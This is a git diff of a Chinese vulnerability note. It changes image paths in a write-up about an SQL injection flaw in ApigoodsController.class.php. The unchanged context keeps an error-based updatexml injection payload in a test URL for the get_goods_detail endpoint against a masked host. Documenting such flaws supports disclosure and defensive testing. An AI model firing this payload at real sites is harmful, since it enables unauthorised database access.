@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](images/202202170929313.png)
+![](<../.gitbook/assets/202202170929313 (1).png>)
 
 存在漏洞的文件为 **ApigoodsController.class.php** , 关键位置为
 
@@ -59,12 +59,12 @@
         );
 ```
 
-![](images/202202170929712.png)
+![](../.gitbook/assets/202202170929712.png)
 
 漏洞测试为
 
-```plain
+```
 https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
 ```
 
-![](images/202202170929602.png)
+![](../.gitbook/assets/202202170929602.png)
